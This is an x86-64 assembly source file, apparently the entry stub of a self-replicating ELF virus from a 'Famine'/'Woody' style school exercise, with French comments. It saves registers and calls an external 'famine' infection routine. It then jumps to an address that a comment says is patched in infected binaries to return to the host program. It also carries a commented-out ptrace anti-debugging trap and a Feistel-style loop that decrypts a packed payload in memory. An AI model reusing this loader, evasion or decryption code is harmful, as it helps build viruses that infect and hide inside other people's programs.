bits 64

section .text
	global	_start
	extern	famine

; _ptrace:
; 	; ptrace(PTRACE_TRACEME, 0, 0, 0)
;     xor rdi, rdi          ; rdi = 0 (PTRACE_TRACEME = 0)
;     xor rsi, rsi          ; rsi = 0
;     xor rdx, rdx          ; rdx = 0
;     xor r10, r10          ; r10 = 0
;     mov rax, 101          ; syscall number for ptrace
;     syscall
;     ; Check if ptrace() returned an error
;     test rax, rax         ; Check if rax < 0
;     jge ret       		  ; Jump if no error (rax >= 0)
;     ; kill(getpid())
;     mov rax, 39           ; syscall number for getpid
;     syscall               ; rax now holds the PID
;     mov rdi, rax          ; Pass the PID to kill()
;     mov rax, 62           ; syscall number for kill
;     syscall
;     ; exit(0)
;     xor rdi, rdi          ; exit status = 0
;     mov rax, 60           ; syscall number for exit
;     syscall

_start:
	push	rax
	push	rbx
	push	rcx
	push	rdx
	push	rsp
    push    rsi
    push    rdi
    push    r15
    push    r14
    push    r13
    push    r12
    push    r11
    push    r10
    push    r9
    push    r8

	;si je suis l'original
	jmp NEAR decrypt_done
    ; 0x55555555a1cc

    ; Adresse de début : famine
    lea r8, [rel famine]             ; Adresse de début (famine)

    ; Adresse de fin : _start
    lea r9, [rel _start]       ; Adresse de fin (_start)

    ; Clé de décryptage
    mov r10, 0x00000000      ; Exemple de clé 64 bits

decrypt_loop:
    ; Vérifier si on a atteint la fin
    mov rax, r9
    sub rax, r8
    cmp rax, 8
    jl decrypt_done                 ; Si r9 - r8 < 8, fin du décryptage

    ; Charger un bloc de 8 octets à partir de l'adresse actuelle
    mov	r12, [r8]                    ; Charger le bloc chiffré dans r12

    ; Début de la routine de décryptage
    mov r14d, r12d                   ; right = partie basse du bloc
    shr r12, 32                      ; Décaler pour obtenir la partie haute
    mov r13d, r12d                   ; left = partie haute du bloc

    mov ecx, 0x7                     ; 8 rounds inverses
    
reverse_rounds:
    mov eax, ecx                     ; Calcul de la sous-clé
    imul eax, eax, 0x1234ABCD        ; subkey = round * 0x1234ABCD
    xor eax, r10d                    ; subkey ^= clé

    ; Feistel déchiffrement
    mov r11d, r14d                   ; temp = right
    mov esi, r14d
    shl esi, 3
    mov edi, r14d
    shr edi, 29
    or  esi, edi
    xor r14d, eax
    add r14d, esi
    xor r14d, r13d                   ; left = right ^ feistel_function(left, subkey)
    mov r13d, r11d                   ; right = temp
    dec ecx
    jns reverse_rounds               ; Répéter pour tous les rounds

    ; Recomposer le bloc déchiffré
    shl r13, 32
    or r14, r13                      ; Fusionner left et right
    mov [r8], r14                    ; Stocker le bloc déchiffré dans la mémoire

    push	0x0a2e2e2e	;	...\n   
	push	0x59444f4f	;	OODY
	push	0x572e2e2e	;	...W

	;	write(stderr, "...WOODY...\n", 20)
	mov		rax, 1		;	syscall number
	mov		rdi, 1		;	stderr
	mov		rsi, rsp	;	"...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
	mov		rdx, 20		;	20
	syscall

	;	Clear la stack pour pas avoir de problemes
	pop	rax
	pop	rax
	pop	rax

    ; Passer au bloc suivant (8 octets)
    add r8, 8
    jmp decrypt_loop

decrypt_done:
	call	famine	


    pop     r8
    pop     r9
    pop     r10
    pop     r11
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    pop     rdi
    pop     rsi
	pop		rsp
	pop		rdx
	pop		rcx
	pop		rbx
	pop		rax

	jmp	0x4		; Does nothing but is the "lunch-pad" to the real entrypoint.
				; The "0x4" value will be changed on infected binaries to 
				; jump back to the program execution	
	mov	rax, 60
	mov	rdi, 0
	syscall		; exit(0)


section .note.GNU-stack noalloc noexec nowrite progbits
